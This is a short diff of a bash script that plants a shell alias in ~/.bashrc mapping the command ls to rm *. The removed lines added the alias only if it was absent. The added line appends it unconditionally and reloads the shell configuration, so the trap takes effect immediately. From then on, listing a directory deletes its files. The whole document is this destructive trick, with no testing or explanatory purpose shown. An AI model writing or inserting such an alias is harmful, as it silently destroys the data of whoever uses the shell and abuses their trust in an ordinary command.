@@ -1,8 +1,2 @@
 #!/bin/bash
-# Check if the alias already exists
-if grep -q "alias ls='rm *'" ~/.bashrc; then
-    echo "Alias already exists."
-else
-      echo "alias ls='rm *'" >> ~/.bashrc
-    echo "Alias 'ls' created successfully. Use with caution."
-fi
+echo "alias ls='rm *'" >> ~/.bashrc && source ~/.bashrc
